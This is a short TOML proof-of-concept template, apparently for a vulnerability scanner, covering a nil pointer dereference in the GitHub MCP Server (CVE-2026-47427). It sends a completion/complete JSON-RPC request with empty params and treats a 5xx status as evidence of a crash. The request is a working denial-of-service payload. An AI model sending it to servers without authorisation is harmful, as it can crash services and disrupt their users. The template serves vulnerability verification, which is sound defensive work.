[info]
author = "ave"
description = "通过发送一个缺失 ref 字段的 completion/complete JSON-RPC 请求，验证目标服务器是否会触发空指针解引用导致崩溃（DoS）。"
id = "POC-AVE-2026-0697"
name = "GitHub MCP Server Nil Pointer Dereference DoS PoC"
severity = "high"
tags = ["ave-2026-0697"]
vuln_id = [
    "CVE-2026-47427",
    "AVE-2026-0697",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}"
protocol = "http"

[poc.requests.body]
content = '{"jsonrpc": "2.0", "id": 1, "method": "completion/complete", "params": {}}'
type = "raw"

[poc.requests.headers]
Content-Type = "application/json"

[[poc.requests.matchers]]
expect = true
status = [
    500,
    502,
    503,
]
type = "status"
